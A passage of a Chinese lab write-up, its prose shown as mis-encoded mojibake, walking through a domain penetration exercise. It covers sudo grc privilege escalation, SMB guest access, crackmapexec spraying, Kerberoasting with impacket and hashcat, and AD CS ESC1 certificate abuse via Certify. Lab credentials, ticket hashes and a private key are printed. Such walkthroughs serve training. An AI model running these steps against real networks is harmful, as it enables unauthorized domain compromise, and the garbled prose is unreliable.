coreå³å¯</p><p>æ‹¿åˆ°shellä¹‹åä¸Šçº¿åšä¸‹æŒä¹…åŒ–å¤„ç†ï¼Œå‘ç°å¹¶érootæƒé™ä¼°è®¡éœ€è¦ææƒï¼ŒæŸ¥çœ‹suidæƒé™å‘½ä»¤å‘ç°å¹¶æ²¡æœ‰å¯åˆ©ç”¨å‘½ä»¤ï¼Œsudo -læ‰§è¡Œåå‘ç°å¯ä»¥æ— å¯†ç æ‰§è¡Œgrcå‘½ä»¤</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240804014202040.png" alt="image-20240804014202040"></p><p>å°è¯•ä½¿ç”¨grcè¿›è¡Œææƒ</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240804014510190.png" alt="image-20240804014510190"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo grc --pty /bin/sh</span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240804014531690.png" alt="image-20240804014531690"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240804014614048.png" alt="image-20240804014614048"></p><h2 id="flag02">flag02</h2><p>å†…ç½‘æ‰«æç»“æœå¦‚ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">172.22.9.19:80 open</span><br><span class="line">172.22.9.47:445 open</span><br><span class="line">172.22.9.26:445 open</span><br><span class="line">172.22.9.7:445 open</span><br><span class="line">172.22.9.26:139 open</span><br><span class="line">172.22.9.47:139 open</span><br><span class="line">172.22.9.26:135 open</span><br><span class="line">172.22.9.7:135 open</span><br><span class="line">172.22.9.7:80 open</span><br><span class="line">172.22.9.47:22 open</span><br><span class="line">172.22.9.19:22 open</span><br><span class="line">172.22.9.47:21 open</span><br><span class="line">172.22.9.47:80 open</span><br><span class="line">172.22.9.7:139 open</span><br><span class="line">172.22.9.7:88 open</span><br><span class="line">172.22.9.19:8983 open</span><br><span class="line">[*] NetBios: 172.22.9.7      [+]DC XIAORANG\XIAORANG-DC     </span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.9.26</span><br><span class="line">   [-&gt;]DESKTOP-CBKTVMO</span><br><span class="line">   [-&gt;]172.22.9.26</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.9.7</span><br><span class="line">   [-&gt;]XIAORANG-DC</span><br><span class="line">   [-&gt;]172.22.9.7</span><br><span class="line">[*] WebTitle: http://172.22.9.19        code:200 len:612    title:Welcome to nginx!</span><br><span class="line">[*] WebTitle: http://172.22.9.47        code:200 len:10918  title:Apache2 Ubuntu Default Page: It works</span><br><span class="line">[*] NetBios: 172.22.9.26     DESKTOP-CBKTVMO.xiaorang.lab        Windows Server 2016 Datacenter 14393 </span><br><span class="line">[*] NetBios: 172.22.9.47     fileserver                          Windows 6.1 </span><br><span class="line">[*] 172.22.9.47  (Windows 6.1)</span><br><span class="line">[*] WebTitle: http://172.22.9.19:8983   code:302 len:0      title:None è·³è½¬url: http://172.22.9.19:8983/solr/</span><br><span class="line">[*] WebTitle: http://172.22.9.7         code:200 len:703    title:IIS Windows Server</span><br><span class="line">[*] WebTitle: http://172.22.9.19:8983/solr/ code:200 len:16555  title:Solr Admin</span><br><span class="line">[+] http://172.22.9.7 poc-yaml-active-directory-certsrv-detect </span><br></pre></td></tr></table></figure><p>å­˜åœ¨ä¸€ä¸ªæ³„éœ²æ¼æ´ï¼Œçœ‹äº†ä¸‹pocæ„Ÿè§‰åƒæ˜¯è¯¯æŠ¥ï¼ŒæŠŠå¼€æ”¾çš„ç«™å¤§è‡´çœ‹äº†çœ‹æ²¡ä»€ä¹ˆèƒ½æ‰“çš„ï¼Œå‘ç°å­˜åœ¨æ–‡ä»¶æœåŠ¡å™¨ï¼Œä½¿ç”¨nmapè¿›ä¸€æ­¥æ‰«æ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Host script results:</span><br><span class="line">| smb2-time:</span><br><span class="line">|   <span class="built_in">date</span>: 2024-08-03T17:59:02</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb-os-discovery:</span><br><span class="line">|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)</span><br><span class="line">|   Computer name: fileserver</span><br><span class="line">|   NetBIOS computer name: FILESERVER\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: fileserver</span><br><span class="line">|_  System time: 2024-08-04T01:59:06+08:00</span><br><span class="line">| smb-security-mode:</span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3:1:1:</span><br><span class="line">|_    Message signing enabled but not required</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ˜¾ç¤ºä½¿ç”¨äº†guestè´¦æˆ·è¿›è¡Œæ‰«æï¼Œå¯èƒ½å­˜åœ¨æœªæˆæƒè®¿é—®æ¼æ´ï¼Œä½¿ç”¨è„šæœ¬å°è¯•è¿æ¥</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240804020628874.png" alt="image-20240804020628874"></p><p>å‘ç°ç¡®å®å­˜åœ¨æœªæˆæƒï¼Œåœ¨secretä¸‹æ‰¾åˆ°äº†flag02ï¼Œå¹¶ä¸”è·å–äº†personnel.dbæ–‡ä»¶</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240804020810284.png" alt="image-20240804020810284"></p><h2 id="flag03">flag03</h2><p>è¿æ¥dbæ–‡ä»¶ï¼Œå‘ç°äº†ä¸€å †ç”¨æˆ·åå’Œå¯†ç ï¼Œå…ˆå°è¯•è¿›è¡Œä¸€æ³¢crackmapexecçˆ†ç ´</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 crackmapexec smb 172.22.9.1/24 -u user.txt -p pass.txt --continue-on-success 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå»ºè®®ä¸€ä¸ªä¸€ä¸ªçˆ†ï¼Œå› ä¸ºçˆ†åˆ°æ–‡ä»¶æœåŠ¡å™¨çš„æ—¶å€™ä¼šå…¨çˆ†æˆåŠŸï¼Œè¿·æƒ‘çš„å¾ˆ</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240804021347442.png" alt="image-20240804021347442"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240804021401644.png" alt="image-20240804021401644"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xiaorang.lab\zhangjian:i9XDE02pLVf</span><br><span class="line">xiaorang.lab\liupeng:fiAzGwEMgTY</span><br></pre></td></tr></table></figure><p>å°è¯•rdpç™»å½•ï¼Œç»“æœå¦‚ä¸‹</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240804021813734.png" alt="image-20240804021813734"></p><p>ä¸¤ä¸ªéƒ½æ˜¯è¿™æ ·çš„è¿”å›ç»“æœï¼Œæ ¹æ®flag02çš„æç¤ºï¼Œè¿™é‡Œåº”è¯¥è¦æŸ¥è¯¢SPNï¼Œè¿™é‡Œéœ€è¦å…ˆç®€å•æåŠå‡ ä¸ªæ¦‚å¿µ</p><h3 id="Kerberos">Kerberos</h3><p>åŸŸç¯å¢ƒä¸­éå¸¸å¸¸è§çš„èº«ä»½è®¤è¯åè®®ï¼Œè®¤è¯è¿‡ç¨‹ä¸»è¦æœ‰ä»¥ä¸‹ä¸‰ä¸ªæ–¹é¢</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240804022155234.png" alt="image-20240804022155234"></p><ul><li>èº«ä»½éªŒè¯æœåŠ¡ (AS) äº¤æ¢ (KRB_AS_*ï¼‰</li><li>ç¥¨è¯æˆäºˆæœåŠ¡ (TGS) äº¤æ¢ (KRB_TGS_*ï¼‰</li><li>å®¢æˆ·ç«¯/æœåŠ¡å™¨ (AP) äº¤æ¢ (KRB_AP_*ï¼‰</li></ul><p>åœ¨è¿™é‡Œæˆ‘ä»¬ä¸»è¦å…³æ³¨çš„æ˜¯TGSäº¤æ¢è¿‡ç¨‹ï¼Œè¿™é‡Œçš„ASå’ŒTGSæ˜¯KDCçš„ä¸¤ä¸ªç»„æˆéƒ¨åˆ†</p><h3 id="SPN">SPN</h3><p>æœåŠ¡ä¸»ä½“åç§°ï¼ˆSPNï¼šServicePrincipal Namesï¼‰æ˜¯æœåŠ¡å®ä¾‹çš„å”¯ä¸€æ ‡è¯†ç¬¦ã€‚å¯ä»¥ç†è§£ä¸ºåŸŸå†…æœåŠ¡çš„èº«ä»½è¯ï¼Œæ¯ä¸ªæœåŠ¡éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„SPNï¼Œè€ŒæœåŠ¡åœ¨æ³¨å†ŒSPNçš„æ—¶å€™ä¼šå’Œè´¦å·è¿›è¡Œç»‘å®šï¼Œå› æ­¤SPNèµ·åˆ°äº†å°†æœåŠ¡å®ä¾‹ä¸æœåŠ¡ç™»å½•å¸æˆ·ç›¸å…³è”çš„ä½œç”¨ã€‚<strong>ä¸€ä¸ªSPNå¯¹åº”ä¸€ä¸ªè´¦æˆ·å’Œä¸€ä¸ªæœåŠ¡ï¼Œä½†ä¸€ä¸ªè´¦æˆ·å¯ä»¥å¯¹åº”å¤šä¸ªSPNå’ŒæœåŠ¡</strong></p><p>è¿™é‡Œæ¯”è¾ƒé‡è¦çš„æ˜¯ï¼Œä»»ä½•ä¸€ä¸ªåŸŸå†…è´¦æˆ·éƒ½å¯ä»¥å‘DCæŸ¥è¯¢æ‰€æœ‰åŸŸå†…ç”¨æˆ·å¯¹åº”çš„<strong>SPN</strong>å¹¶è¿›è¡Œ<strong>TGSäº¤æ¢</strong>è¿‡ç¨‹ï¼Œåœ¨<strong>KRB_TGS_REP</strong>è¿‡ç¨‹å°†ä¼šè¿”å›æŸ¥è¯¢åˆ°çš„ç”¨æˆ·çš„<strong>TGS tickets</strong>ï¼Œç„¶åæˆ‘ä»¬å³å¯ä½¿ç”¨çˆ†ç ´å·¥å…·å¯¹äºè¿”å›çš„ç¥¨æ®è¿›è¡Œçˆ†ç ´ï¼Œè·å–å¯¹åº”æ˜æ–‡ã€‚</p><h3 id="æŸ¥è¯¢ç»“æœå¦‚ä¸‹">æŸ¥è¯¢ç»“æœå¦‚ä¸‹</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-GetUserSPNs -request -dc-ip 172.22.9.7 xiaorang.lab/liupeng:fiAzGwEMgTY 2&gt;/dev/null</span><br><span class="line">proxychains4 impacket-GetUserSPNs -request -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf 2&gt;/dev/null</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$krb5tgs$23$*zhangxia<span class="variable">$XIAORANG</span>.LAB<span class="variable">$xiaorang</span>.lab/zhangxia*$13288c81c67ba7897cac2231d7ac9cb5<span class="variable">$da825bd13667cca66080fbd097e26db11c13f5c3c654b6eb768d77dc174761bf91230aecd34133bc583ac5fa9e6d9011d576dc49296c9948408d5a30231af8bb47efea9b129bdee900c9dffb768eecb5c26b63d0f0dbf09360f0d7981856301beb0e41093dca962dd21813d4b9ae051579df75ebbb1e6a4ea3de0278ba25744d43db7399da8d273c7344626555598814513093fe8d8306ceaac6ff4989ac683b84ab54bc74d06b35efeb79ded926f409bd2be84b135f053242a568babf7903a55343a3ab42e453e3cecb431cc93390f9c143ea4830275c9b0e74e77ffbcf9dc44793f139cb501ed0f744c057d7fe5bde2c276350b1b1337cde3263b0307226cd3bcc3d0eebcc1928aaae1b7444ccc5324808d3e83bc227f9b09ce55c84247fa5227d6db3e32c3fccd362ca501c6b7d04835188c5db5c6df48b10206309ab8725c84ff23a1c61aa135b360db7b24db17ed5bfcd9f225283c317cee73bb954815f4f3c2fcbbb4a17c865b86535c34f8db9853937fb41508a633ba4af90aad065ab4455d27101b304d5cf672a00e12a44a13146ea9a9196c6833fda9a2cbe78ead58672c4680d7f720d3cdef8738f6c007d6f47a59d7f77acd70acb1492e0ef09faab42c54b3af487c31add18343e3ee7d2bd4c3f6d88cc271b397c195e07a4668723854190e7706e18875886be8d5af29a26ae010f2bcff9d3db3b53563f4f8c2efe7adc0a5a6a59017ece07f47a656e5de3fcb01eece1aa2c721e1d284615233056d56ea32c6dbd923b3ae6b6a609a2e0d1992d408c4703562e47af94be585ecb61140202c8cc42f6e14117026cdee449b0ac996f704b5dcdad4c20d1c346a600cced7422e499d8eabfca9c86903ee2d24f7f1392279dd90c6d5c22b8e53c90e367379cccc7f62c2107c8c5e56bb7148fd4d41bf7e63e2373f5ddc631ce73364404bee3324d4c3556951ca9e36fd15d7ff65b9352ae20a73a27a8c419ccc1281b884242ea6ecceea809d0502c9b598aefc0c3d5c798305b395ac23e9b0da9b9c74910c307428127fe9eeaeb8227e3a8f168000f33f9d5040e256b5b0374e3343aa8ef1e5d62e0433190723bc4c39ffce427194b0ef4380d11013a8d0ad5f196097f5200c0d7beb1ea98d8a13a36cfb2e89d63356860f6be81a7d05dc131d48149e54b07db82d1431d32a866e29a9463d90b170b8bee496767c892bbd81906d91dcd8534d99a8e4320cdbdc62a8673c158c452c178e55bb680fdb37b721da5d65d78e4705280a167f39b1c81fc6d9660244fa96293cc4285189333fb82fa5d3b3dfa7ebc57a50a99507a526cf678fb7205e930d547d780ebf63b6d7ac0c5e553f8bdf1d7efb497d3779060c865c4bc955131eb242e0efb2e804a215305041bb07fd832109d9e55f1b6043730412fc1e68c929afb58d7a6ff0df472f669659d9193d31ceac7ed3dd3341a7ab816d088dc84001a3f7c660bfa10f8d9fbefee03dc9a07f0e7d64bf88e1f7e0a51c82b6c</span></span><br><span class="line">$krb5tgs$23$*chenchen<span class="variable">$XIAORANG</span>.LAB<span class="variable">$xiaorang</span>.lab/chenchen*$5199d92f23d1475890b372e8a7b0540d<span class="variable">$c4a300433edcea30edef3ef53e42e32effa1de63b3edc3555f35b0f6d46c039758ab09c2c51ebeacfa7cb83c744e46b6eeaf45a7b7937aedaa8ed46c5e224235c953fd152f33d9def1a566cc00beee0dd5a83bf937a28aca2a025e56d7243b83cb51c73c526ba69917764d1c4a775c86e27ce16bf733a8a0ae31d7c32fdf33c99d89dc34ebcc20498ef6d59472a34fd76e5fed48b188a3968a6d8a3ec4fa7ba0e3ca773082df24ca022dc4d2c1c055d05dc429c8448dc5a55a466f739ab394596527b336eff8fe8dd5a6712b09e116a0718ca6392e3ccdb2eef1732f4f27f6da4b90c9030418e2249b2c5f8dfd08335a94c552927a77d85d2c8e6c67550900ba7dcf40a8dc03f3e28389d0b399133816e66774a6ac6ce6f09fec09d117528188e96e4ff589cf183416aa3aa8c16f0211459946e9ed2d29ea39f68fbd6dc7989263f382561399417fcfa5ea254b8a973538399a11cef5fada4455ac0557c97033cf9a68776f08db2ebbbf7e7f1c32aebc9ac1c5489db62b80a3f2b10b214bae79ff9e489df1726812f46e5e8a0234d1a58fb17a032c94b3911e161cb83b53bbd9d7262604a7fd0c48d0123239f53a35c87c40b8660d017fbaccc4e8745653d3e113d04441997fc46646382074ecb3a02cc6d89b9a7da3fe2691433fba2a99b59b10d4479f4f038b1bec110595327a50470b0eb86d50dc84b8a61748e6532a55a39f0ee71f654e2ec441588b7bcde70c6b2618bc52ff480e57e55dca6afe9abfe244808fe261ee4b43fc8a43e23f140b8ac63000a7b576eabea681cc67b3771e60b08bda02ba737e9fa7e661ef46df685030e6b8ad5a4597d5e6a17fbf8fcdbbcf3df461cdb654a98bb2d0775036e99bd051550704c9463bed660025a59fc53341c466349f113e159237d4952c7b84025321e7217f9d6c761eed3fa4937f17492d3d6c4fb45b4924ebb900ff00f32f76e22839441020aa65f405638b82edd7f8ca65b92548c79a742fcb2facd86b96a6d8019cbbc138fa0a7ff9196c228354aefcf6dce54ad453f346e93329544f2bb62a0cc29dbb7bfc447426127f14fa54fab85134ef4d47802b1be6ee26a7df056e6521f0c067ec759022ee5fc37e7ed430ee12535697980a2b5963f016c68bbaa58fddfd3c9eef8f4349c33561da679cb9b704b3d5a865d9190b152c0861635203f6565a655c1ae6de9eb69b89ce9742c04f318dacb888da6c31a1febc151bba96c4dc93212338ca3b02a1afdeb696725bce59ac7419074d8ae069a1beb48ff1c1851770d461b2277e322456865c7baedf7e723c3815a30230f6886b454cda13f3bfb2e2e52d856a670124f65f379146afe69ce88f02a1ac8c1e24c826971621fe0a5cb8e38574229a8b4603cf7ff1cf95f06cf6f91821528ac0a7881a47e5288b1c108bf0df297d5757de745abdc6c4de655fb4abbf3c59747077d5d862152faf7dd0001695196c0d03d168cf0deda63b43eb64099d454519ef62954a1aa22b</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 -m 13100 hash.txt ./rockyou.txt</span><br></pre></td></tr></table></figure><p>çˆ†ç ´å‡ºæ¥ä¸¤ä¸ªå¯†ç </p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240804024453822.png" alt="image-20240804024453822"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xiaorang.lab\zhangxia MyPass2@@6</span><br><span class="line">xiaorang.lab\chenchen @Passw0rd@</span><br></pre></td></tr></table></figure><p>rdpç™»å½•æˆåŠŸï¼Œä½†æ˜¯æ²¡æœ‰æƒé™è¯»flagï¼Œç”±äºå­˜åœ¨CAè®¤è¯æœåŠ¡å™¨ç»“åˆé¢˜ç›®åï¼Œå°è¯•æŸ¥çœ‹æ˜¯å¦å­˜åœ¨é”™è¯¯é…ç½®çš„è¯ä¹¦</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Certify.exe find /vulnerable</span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240804030255241.png" alt="image-20240804030255241"></p><p>é‡ç‚¹æŸ¥çœ‹è¿™ä¸‰ä¸ªå±æ€§æ˜¯å¦ç¬¦åˆæ¼æ´ï¼ˆESC1ï¼‰æ¡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msPKI-Certificate-Name-Flag:ENROLLEE_SUPPLIES_SUBJECT</span><br><span class="line"></span><br><span class="line">mspki-certificate-application-policy:å®¢æˆ·ç«¯èº«ä»½éªŒè¯</span><br><span class="line"></span><br><span class="line">Enrollment Rights:XIAORANG\Domain Users</span><br></pre></td></tr></table></figure><p>å®Œå…¨å»åˆï¼Œgoodï¼Œæ‰“</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Certify.exe request /ca:XIAORANG-DC.xiaorang.lab\xiaorang-XIAORANG-DC-CA /template:<span class="string">&quot;XR Manager&quot;</span> /altname:administrator</span><br></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Public&gt;Certify.exe request /ca:XIAORANG-DC.xiaorang.lab\xiaorang-XIAORANG-DC-CA /template:<span class="string">&quot;XR Manager&quot;</span> /altname:administrator</span><br><span class="line"></span><br><span class="line">   _____          _   _  __</span><br><span class="line">  / ____|        | | (_)/ _|</span><br><span class="line"> | |     ___ _ __| |_ _| |_ _   _</span><br><span class="line"> | |    / _ \ <span class="string">&#x27;__| __| |  _| | | |</span></span><br><span class="line"><span class="string"> | |___|  __/ |  | |_| | | | |_| |</span></span><br><span class="line"><span class="string">  \_____\___|_|   \__|_|_|  \__, |</span></span><br><span class="line"><span class="string">                             __/ |</span></span><br><span class="line"><span class="string">                            |___./</span></span><br><span class="line"><span class="string">  v1.1.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Action: Request a Certificates</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Current user context    : XIAORANG\zhangxia</span></span><br><span class="line"><span class="string">[*] No subject name specified, using current context as subject.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Template                : XR Manager</span></span><br><span class="line"><span class="string">[*] Subject                 : CN=zhangxia, CN=Users, DC=xiaorang, DC=lab</span></span><br><span class="line"><span class="string">[*] AltName                 : administrator</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Certificate Authority   : XIAORANG-DC.xiaorang.lab\xiaorang-XIAORANG-DC-CA</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] CA Response             : The certificate had been issued.</span></span><br><span class="line"><span class="string">[*] Request ID              : 5</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] cert.pem         :</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-----BEGIN RSA PRIVATE KEY-----</span></span><br><span class="line"><span class="string">MIIEpAIBAAKCAQEAuFeHUOimAXdXIeX0QYZjFv3MRkvPLODA4QKxZ3fKWiJXfnWR</span></span><br><span class="line"><span class="string">w6hTC+/RMWTdGWR7R97ybagQjKCxOO5IPuqxh+XX2s/aUfAZVd0+/HXD586+uK0U</span></span><br><span class="line"><span class="string">+W2w7mwrfVYw2dja2+i8bpR6A/QROD3B6S9Ra0uuP04IpifmDIu2Mow6Yo9lwT7D</span></span><br><span class="line"><span class="string">oIMqiKOPoSZQ2Tm5P/OtrfWDyU+qe8x6Ht4ovV2b9S+nnrUm6kPkotvHL465R46t</span></span><br><span class="line"><span class="string">uxpLtZxV+E/zC/8p3vU3qsnaIBRc/h10LOUFCPiiNNvSd0tJWlk7f6KWt2lXmJSl</span></span><br><span class="line"><span class="string">XWj/8C5n1r+R8KrgN0ccYn8mVLG5hljZ1fgF3wIDAQABAoIBAAP6L3s5acuCTaj3</span></span><br><span class="line"><span class="string">kyuOwLiQRUYHALNRLhgsvLMkzILhVs3tr3VvPkt1oyfTq0mO93H3h3eCNskx9mDq</span></span><br><span class="line"><span class="string">Ezj4S1hJRzz7WxSFf6ZwnZlI2S85MLg/U8KF8VlTkCSmJWut2BsCjH4+Sdun+m8i</span></span><br><span class="line"><span class="string">NfrYAIO2IE5RWrJrDfWbVhUFHYVe1UanlurJDpOzBVFTiqJrYBkOPvpjHJwFS9Wk</span></span><br><span class="line"><span class="string">cPvS1NQ0+gvK0Ud3swtMDhXvCmhVx9jWDPwYQFHBEi+g3ynnu6dZ7gi8mAVw/pC7</span></span><br><span class="line"><span class="string">NOGBeCpfEqDmsay5QQVnBOVD3U0vgw78rK5hXIr29teInl0iw89aRAdirlgQQ6ll</span></span><br><span class="line"><span class="string">GzmitaECgYEAyYV2Ix5CiKx+3vCG7ljQ50Bbu9JALfwffCbh1gA5IyVzLajCwu4K</span></span><br><span class="line"><span class="string">7HG4wVrArH42R/Iq4KRxWosWWzTQ9PQNKvUp26/1+OjYf03PdceXiqC2VehewW+9</span></span><br><span class="line"><span class="string">s62WyM9yYPApqEu9ZFjrWhvhcREiufWQLVflJkZEerruLAjhckVqD8cCgYEA6i0k</span></span><br><span class="line"><span class="string">rR07rawOx80SiZ1gCVIWq9wN3hsOK6CLTBVDgCeztX3gNQXxGyaC6+InWojBx2Zt</span></span><br><span class="line"><span class="string">P3vSggChgmwKQU1fbYR7z13tc36+lJhyoqg5/BDFMd7lm3RgAdJo9P2J6Bmopcuf</span></span><br><span class="line"><span class="string">MIhI+iNThEKh7nmh803Os4xZf0pa9RxJTnImiSkCgYEAvpSsK/wjGhRgC8DXKrPu</span></span><br><span class="line"><span class="string">JLUVzCPDtHl64TP4YiVl49o3+hde0XDD/eZyvtFv4/Gcrh/U8wwxc1qUcv8ZGn9v</span></span><br><span class="line"><span class="string">sI+Y3X2klpjGnmZc69stctoYdlhCvJdLhZCGSDT/y7N1AgdW/n6lXVt+sipteAZH</span></span><br><span class="line"><span class="string">Ksq0GKVdf+Am/JgNdb811eMCgYEAx0t6HjZ11r1KqvI1Z5be56/MCaEy0CaYbbqp</span></span><br><span class="line"><span class="string">MiwakVO4lqo1CQswgdnJrDSBJ4Sh3jCmo1Oe+PLOgW+vXpoZr9wDfpzCe/uO+Gmx</span></span><br><span class="line"><span class="string">jgq7pnEjUekP4bguCP7oQjAQkM5dgBSGO0iRSwiLiFEo/QrZMHa0hovYkwNV26qi</span></span><br><span class="line"><span class="string">HLf7YdkCgYBRXkHSgvlvl72uSSIMMXD8lx4XGdo4sKlH44WioeL0M5t5aJiYVQvE</span></span><br><span class="line"><span class="string">DfPePBRKim+PJiloeX0qIxSsEp89qRoN2cXdWpGqX916rz3nZKdQ9UG9g1LsGoyZ</span></span><br><span class="line"><span class="string">BilSirIsDpFtR0oKCp8XyMzIuZ6mRUJNFWDWyfdN0Otj9JyPSyIelg==</span></span><br><span class="line"><span class="string">-----END RSA PRIVATE KEY-----</span></span><br><span class="line"><span class="string">-----BEGIN CERTIFICATE-----</span></span><br><span class="line"><span class="string">MIIGQTCCBSmgAwIBAgITfgAAAAWHAI3RYCNargAAAAAABTANBgkqhkiG9w0BAQsF</span></span><br><span class="line"><span class="string">ADBRMRMwEQYKCZImiZPyLGQBGRYDbGFiMRgwFgYKCZImiZPyLGQBGRYIeGlhb3Jh</span></span><br><span class="line"><span class="string">bmcxIDAeBgNVBAMTF3hpYW9yYW5nLVhJQU9SQU5HLURDLUNBMB4XDTI0MDgwMzE4</span></span><br><span class="line"><span class="string">NTgwNloXDTI1MDgwMzE4NTgwNlowUjETMBEGCgmSJomT8ixkARkWA2xhYjEYMBYG</span></span><br><span class="line"><span class="string">CgmSJomT8ixkARkWCHhpYW9yYW5nMQ4wDAYDVQQDEwVVc2VyczERMA8GA1UEAxMI</span></span><br><span class="line"><span 